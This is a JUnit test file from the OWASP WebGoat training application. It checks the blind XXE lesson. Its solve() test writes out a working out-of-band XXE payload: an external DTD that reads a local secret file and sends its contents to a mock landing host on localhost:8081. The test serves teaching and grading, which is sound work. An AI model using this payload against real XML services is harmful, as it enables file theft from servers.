package org.owasp.webgoat.plugin;

import com.github.tomakehurst.wiremock.client.WireMock;
import com.github.tomakehurst.wiremock.junit.WireMockRule;
import com.github.tomakehurst.wiremock.verification.LoggedRequest;
import org.hamcrest.CoreMatchers;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.owasp.webgoat.plugins.LessonTest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import java.io.File;
import java.util.List;

import static com.github.tomakehurst.wiremock.client.WireMock.*;
import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * @author nbaars
 * @since 5/4/17.
 */
@RunWith(SpringJUnit4ClassRunner.class)
public class BlindSendFileAssignmentTest extends LessonTest {

    @Autowired
    private Comments comments;
    @Value("${webgoat.user.directory}")
    private String webGoatHomeDirectory;

    @Rule
    public WireMockRule webwolfServer = new WireMockRule(8081);

    @Before
    public void setup() throws Exception {
        XXE xxe = new XXE();
        when(webSession.getCurrentLesson()).thenReturn(xxe);
        this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
        when(webSession.getUserName()).thenReturn("unit-test");
    }

    @Test
    public void validCommentMustBeAdded() throws Exception {
        int nrOfComments = comments.getComments().size();
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                .content("<comment><text>test</text></comment>"))

                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
        assertThat(comments.getComments().size()).isEqualTo(nrOfComments + 1);
    }

    @Test
    public void wrongXmlShouldGiveErrorBack() throws Exception {
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                .content("<comment><text>test</ext></comment>"))

                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))))
                .andExpect(jsonPath("$.output", CoreMatchers.is("javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,22]\\nMessage: The element type \\\"text\\\" must be terminated by the matching end-tag \\\"<\\/text>\\\".]")));
    }

    @Test
    public void solve() throws Exception {
        File targetFile = new File(webGoatHomeDirectory, "/XXE/secret.txt");
        String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!ENTITY % file SYSTEM \"" + targetFile.toURI().toString() + "\">\n" +
                "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:8081/landing?text=%file;'>\">\n" +
                "%all;";
        webwolfServer.stubFor(get(WireMock.urlMatching("/files/test.dtd"))
                .willReturn(aResponse()
                        .withStatus(200)
                        .withBody(dtd)));
        webwolfServer.stubFor(get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));
        String xml = "<?xml version=\"1.0\"?>" +
                "<!DOCTYPE comment [" +
                "<!ENTITY % remote SYSTEM \"http://localhost:8081/files/test.dtd\">" +
                "%remote;" +
                "]>" +
                "<comment><text>test&send;</text></comment>";

        //Call with XXE injection
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                .content(xml))

                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));

        List<LoggedRequest> requests = findAll(getRequestedFor(urlMatching("/landing.*")));
        assertThat(requests.size()).isEqualTo(1);
        String text = requests.get(0).getQueryParams().get("text").firstValue();

        //Call with retrieved text
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                .content("<comment><text>" + text + "</text></comment>"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.solved"))));
    }

}